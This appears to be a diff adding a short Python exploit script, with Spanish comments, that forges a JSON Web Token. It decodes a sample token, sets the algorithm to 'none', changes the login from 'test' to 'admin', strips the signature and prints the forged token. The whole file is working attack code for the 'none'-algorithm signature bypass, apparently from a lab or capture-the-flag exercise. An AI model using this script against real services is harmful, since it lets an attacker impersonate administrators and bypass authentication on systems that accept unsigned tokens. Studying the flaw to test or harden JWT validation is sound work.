@@ -1,0 +1,45 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import base64
+
+def base64url_decode(payload):
+    # Añade el padding '=' dinámicamente según el residuo de la longitud
+    rem = len(payload) % 4
+    if rem > 0:
+        payload += "=" * (4 - rem)
+    # Reemplaza caracteres de Base64URL a Base64 estándar antes de decodificar
+    return base64.urlsafe_b64decode(payload.encode('utf-8')).decode('utf-8')
+
+def base64url_encode(payload):
+    # Codifica a Base64URL y elimina los caracteres '=' de padding
+    encoded = base64.urlsafe_b64encode(payload.encode('utf-8')).decode('utf-8')
+    return encoded.rstrip("=")
+
+# 1. Definir el token original
+jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ"
+
+# 2. Separar las tres secciones
+header, payload, signature = jwt.split('.')
+
+# 3. Decodificar las secciones
+decoded_header = base64url_decode(header)
+decoded_payload = base64url_decode(payload)
+
+print(f"[*] Original Header:  {decoded_header}")
+print(f"[*] Original Payload: {decoded_payload}\n")
+
+# 4. Modificar los valores (Cambiar algoritmo a 'none' y usuario a 'admin')
+# Nota: Se usa 'none' tanto en minúscula como en mayúscula según el backend
+modified_header = decoded_header.replace('HS256', 'none')
+modified_payload = decoded_payload.replace('test', 'admin')
+
+# 5. Volver a codificar en formato Base64URL
+new_header = base64url_encode(modified_header)
+new_pathload = base64url_encode(modified_payload)
+
+# 6. Construir el JWT final explotando la vulnerabilidad (Sin firma, pero con el punto final)
+forged_jwt = f"{new_header}.{new_pathload}."
+
+print(f"[+] Token Falsificado Exitosamente:")
+print(forged_jwt)
